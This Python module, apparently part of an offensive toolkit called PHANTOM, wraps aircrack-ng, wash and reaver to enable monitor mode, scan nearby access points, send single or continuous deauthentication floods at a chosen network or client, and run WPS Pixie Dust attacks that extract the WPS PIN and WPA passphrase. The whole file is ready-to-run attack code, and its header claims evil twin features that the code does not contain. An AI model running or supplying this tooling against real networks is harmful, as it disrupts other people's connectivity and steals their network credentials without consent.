#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM Wireless Module

Wireless network analysis, deauthentication,
and evil twin capabilities.
"""

import os
import subprocess
import re
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class AccessPoint:
    """Access point information"""
    bssid: str
    ssid: str
    channel: int
    signal: int
    encryption: str
    cipher: str = ""
    auth: str = ""
    clients: List[str] = field(default_factory=list)


@dataclass
class WirelessClient:
    """Wireless client information"""
    mac: str
    bssid: str
    signal: int
    packets: int
    probes: List[str] = field(default_factory=list)


class InterfaceManager:
    """Manage wireless interfaces"""
    
    def get_interfaces(self) -> List[str]:
        """Get list of wireless interfaces"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = re.findall(r'^(\w+)\s+IEEE', result.stdout, re.MULTILINE)
            return interfaces
        except Exception:
            return []
    
    def enable_monitor_mode(self, interface: str) -> Optional[str]:
        """Enable monitor mode on interface"""
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
            
            # Enable monitor mode
            result = subprocess.run(
                ['airmon-ng', 'start', interface],
                capture_output=True,
                text=True
            )
            
            # Find monitor interface name
            match = re.search(r'(\w+mon)', result.stdout)
            if match:
                return match.group(1)
            
            # Try common naming convention
            return f"{interface}mon"
            
        except Exception as e:
            print(f"[-] Failed to enable monitor mode: {e}")
            return None
    
    def disable_monitor_mode(self, interface: str) -> bool:
        """Disable monitor mode"""
        try:
            subprocess.run(['airmon-ng', 'stop', interface], check=True)
            return True
        except Exception:
            return False
    
    def set_channel(self, interface: str, channel: int) -> bool:
        """Set interface channel"""
        try:
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], check=True)
            return True
        except Exception:
            return False


class NetworkScanner:
    """Scan for wireless networks"""
    
    def __init__(self):
        self.interface_manager = InterfaceManager()
    
    def scan(self, interface: str, duration: int = 30) -> List[AccessPoint]:
        """Scan for access points"""
        access_points = []
        
        try:
            # Run airodump-ng
            output_file = f"/tmp/phantom_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            process = subprocess.Popen(
                ['airodump-ng', '-w', output_file, '--output-format', 'csv', interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Let it run for specified duration
            import time
            time.sleep(duration)
            process.terminate()
            
            # Parse results
            csv_file = f"{output_file}-01.csv"
            if os.path.exists(csv_file):
                access_points = self._parse_csv(csv_file)
                os.remove(csv_file)
            
        except Exception as e:
            print(f"[-] Scan error: {e}")
        
        return access_points
    
    def _parse_csv(self, filepath: str) -> List[AccessPoint]:
        """Parse airodump-ng CSV output"""
        access_points = []
        
        try:
            with open(filepath, 'r', errors='ignore') as f:
                lines = f.readlines()
            
            in_ap_section = True
            
            for line in lines:
                line = line.strip()
                
                if not line or line.startswith('BSSID'):
                    continue
                
                if 'Station MAC' in line:
                    in_ap_section = False
                    continue
                
                if in_ap_section:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        try:
                            ap = AccessPoint(
                                bssid=parts[0].strip(),
                                ssid=parts[13].strip() if len(parts) > 13 else "",
                                channel=int(parts[3].strip()) if parts[3].strip().isdigit() else 0,
                                signal=int(parts[8].strip()) if parts[8].strip().lstrip('-').isdigit() else 0,
                                encryption=parts[5].strip(),
                                cipher=parts[6].strip() if len(parts) > 6 else "",
                                auth=parts[7].strip() if len(parts) > 7 else ""
                            )
                            access_points.append(ap)
                        except Exception:
                            continue
        
        except Exception as e:
            print(f"[-] Parse error: {e}")
        
        return access_points


class DeauthAttacker:
    """Deauthentication attack module"""
    
    def deauth(self, interface: str, target_bssid: str, client_mac: str = None, 
               count: int = 10) -> bool:
        """Send deauthentication packets"""
        try:
            cmd = ['aireplay-ng', '-0', str(count), '-a', target_bssid]
            
            if client_mac:
                cmd.extend(['-c', client_mac])
            
            cmd.append(interface)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.returncode == 0
            
        except Exception as e:
            print(f"[-] Deauth error: {e}")
            return False
    
    def continuous_deauth(self, interface: str, target_bssid: str, 
                          client_mac: str = None) -> subprocess.Popen:
        """Start continuous deauthentication"""
        cmd = ['aireplay-ng', '-0', '0', '-a', target_bssid]
        
        if client_mac:
            cmd.extend(['-c', client_mac])
        
        cmd.append(interface)
        
        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


class WPSCracker:
    """WPS PIN cracking"""
    
    def check_wps(self, interface: str, bssid: str) -> Dict[str, Any]:
        """Check if WPS is enabled"""
        try:
            result = subprocess.run(
                ['wash', '-i', interface, '-s', '-j'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse JSON output
            import json
            networks = json.loads(result.stdout) if result.stdout else []
            
            for network in networks:
                if network.get('bssid', '').lower() == bssid.lower():
                    return {
                        'wps_enabled': True,
                        'wps_locked': network.get('wps_locked', False),
                        'version': network.get('wps_version', '')
                    }
            
            return {'wps_enabled': False}
            
        except Exception as e:
            return {'error': str(e)}
    
    def pixie_dust(self, interface: str, bssid: str, channel: int) -> Dict[str, Any]:
        """Attempt Pixie Dust attack"""
        try:
            result = subprocess.run(
                ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), 
                 '-K', '1', '-vv'],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            # Parse output for PIN
            pin_match = re.search(r'WPS PIN:\s*(\d+)', result.stdout)
            psk_match = re.search(r'WPA PSK:\s*(.+)', result.stdout)
            
            if pin_match:
                return {
                    'success': True,
                    'pin': pin_match.group(1),
                    'psk': psk_match.group(1) if psk_match else None
                }
            
            return {'success': False, 'output': result.stdout}
            
        except Exception as e:
            return {'error': str(e)}


class WirelessModule:
    """
    Master Wireless Module
    
    Provides:
    - Interface management
    - Network scanning
    - Deauthentication attacks
    - WPS cracking
    - Client enumeration
    """
    
    def __init__(self):
        self.interface_manager = InterfaceManager()
        self.network_scanner = NetworkScanner()
        self.deauth_attacker = DeauthAttacker()
        self.wps_cracker = WPSCracker()
        self.monitor_interface: Optional[str] = None
    
    def get_interfaces(self) -> List[str]:
        """Get wireless interfaces"""
        return self.interface_manager.get_interfaces()
    
    def start_monitor_mode(self, interface: str) -> bool:
        """Start monitor mode"""
        self.monitor_interface = self.interface_manager.enable_monitor_mode(interface)
        return self.monitor_interface is not None
    
    def stop_monitor_mode(self) -> bool:
        """Stop monitor mode"""
        if self.monitor_interface:
            result = self.interface_manager.disable_monitor_mode(self.monitor_interface)
            self.monitor_interface = None
            return result
        return False
    
    def scan_networks(self, duration: int = 30) -> List[AccessPoint]:
        """Scan for wireless networks"""
        if not self.monitor_interface:
            print("[-] Monitor mode not enabled")
            return []
        
        return self.network_scanner.scan(self.monitor_interface, duration)
    
    def deauth_attack(self, target_bssid: str, client_mac: str = None, 
                      count: int = 10) -> bool:
        """Execute deauthentication attack"""
        if not self.monitor_interface:
            print("[-] Monitor mode not enabled")
            return False
        
        return self.deauth_attacker.deauth(
            self.monitor_interface, 
            target_bssid, 
            client_mac, 
            count
        )
    
    def check_wps(self, bssid: str) -> Dict[str, Any]:
        """Check WPS status"""
        if not self.monitor_interface:
            return {'error': 'Monitor mode not enabled'}
        
        return self.wps_cracker.check_wps(self.monitor_interface, bssid)
    
    def pixie_dust_attack(self, bssid: str, channel: int) -> Dict[str, Any]:
        """Execute Pixie Dust attack"""
        if not self.monitor_interface:
            return {'error': 'Monitor mode not enabled'}
        
        return self.wps_cracker.pixie_dust(self.monitor_interface, bssid, channel)
